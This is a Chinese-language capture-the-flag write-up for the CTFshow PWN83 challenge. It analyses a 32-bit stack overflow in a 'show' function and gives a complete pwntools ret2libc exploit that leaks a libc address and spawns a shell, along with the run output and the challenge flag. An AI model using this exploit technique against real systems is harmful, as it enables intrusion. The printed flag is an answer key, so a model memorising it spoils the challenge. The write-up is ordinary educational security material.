# CTFshow PWN83 WP

## 题目信息

- 目标：`pwn.challenge.ctf.show:28168`
- 本地文件：`challenges/pwn83`
- 类型：栈溢出、ret2libc
- Flag：`ctfshow{812cf388-54b4-4d84-9381-9f64e66c319d}`

## 保护检查

```text
Arch:     i386-32-little
RELRO:    Partial RELRO
Canary:   No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

程序是 32 位 ELF，地址固定，没有 canary；NX 开启，所以不直接执行栈上的 shellcode，而是使用 ROP/ret2libc。

## 逆向分析

程序的关键函数 `show` 反汇编如下：

```asm
080484f6 <show>:
    push   ebp
    mov    ebp, esp
    push   ebx
    sub    esp, 0x74
    ...
    lea    edx, [ebp-0x6c]
    push   edx
    push   0x100
    push   0
    call   read@plt
    ...
    leave
    ret
```

`read(0, ebp-0x6c, 0x100)` 最多写入 256 字节，但局部缓冲区距离 `ebp` 只有 `0x6c = 108` 字节，因此可以覆盖保存的返回地址。

栈布局为：

```text
buffer              108 bytes
saved ebp             4 bytes
saved return address  4 bytes
```

覆盖返回地址所需的偏移为：

```text
0x6c + 4 = 0x70 = 112
```

程序没有 `win` 函数，但导入了 `write`，因此可以先调用 `write@plt` 泄露 `write@got` 中的 libc 地址，再计算 libc 基址并调用 `system("/bin/sh")`。

## 利用过程

### 第一阶段：泄露 libc

32 位 cdecl 函数的参数位于栈上。覆盖返回地址后，第一阶段 ROP 栈布局为：

```text
padding(112)
write@plt
show                 # write 返回后重新进入 show，接收第二阶段
1                    # fd = stdout
write@got            # 要输出的地址
4                    # 输出 4 字节
```

对应的调用为：

```c
write(1, write_got, 4);
```

远程环境中观察到的 libc 为 Ubuntu i386 libc，相关偏移为：

```text
write       0xe57f0
system      0x3cf10
"/bin/sh"  0x17b9db
```

因此：

```python
libc_base = leaked_write - 0xe57f0
```

### 第二阶段：ret2libc

第二次进入 `show` 后，发送：

```text
padding(112)
system
show                 # system 返回地址，占位即可
bin_sh               # system 的第一个参数
```

这等价于：

```c
system("/bin/sh");
```

需要注意，第二阶段发送后不能立即发送 shell 命令。`show` 内部的 `read` 可能还在等待数据，命令会被它当作溢出输入读走，因此脚本中等待一小段时间后再发送命令。

## 完整 Exploit

文件：`exploits/pwn83.py`

```python
from pwn import *
import os

context.arch = "i386"
context.log_level = "info"

HOST = "pwn.challenge.ctf.show"
PORT = 28168
elf = ELF(os.path.join(os.path.dirname(__file__), "..", "challenges", "pwn83"), checksec=False)

io = remote(HOST, PORT)
io.recvuntil(b"!\n")

offset = 112

# write(1, write@got, 4)，泄露真实 libc 地址
leak_payload = flat(
    b"A" * offset,
    elf.plt["write"],
    elf.symbols["show"],
    1,
    elf.got["write"],
    4,
)
io.send(leak_payload)

write_addr = u32(io.recvn(4))
libc_base = write_addr - 0xE57F0
log.info("write@libc = %#x", write_addr)
log.info("libc base   = %#x", libc_base)

system = libc_base + 0x3CF10
bin_sh = libc_base + 0x17B9DB

shell_payload = flat(
    b"B" * offset,
    system,
    elf.symbols["show"],
    bin_sh,
)
io.send(shell_payload)

sleep(1)
io.sendline(b"cat /ctfshow_flag")
print(io.recvrepeat(3).decode(errors="replace"))
```

运行：

```bash
python3 -c 'import runpy; runpy.run_path("exploits/pwn83.py", run_name="__main__")'
```

实测输出：

```text
[*] write@libc = 0xf7eca7f0
[*] libc base   = 0xf7de5000
ctfshow{812cf388-54b4-4d84-9381-9f64e66c319d}
```

## 总结

本题的核心是 `show` 中 `read` 的栈溢出。由于没有 canary 和 PIE，覆盖返回地址很直接；通过 `write@plt` 泄露 `write@got`，计算 libc 基址后调用 `system("/bin/sh")`，最终读取 `/ctfshow_flag`。
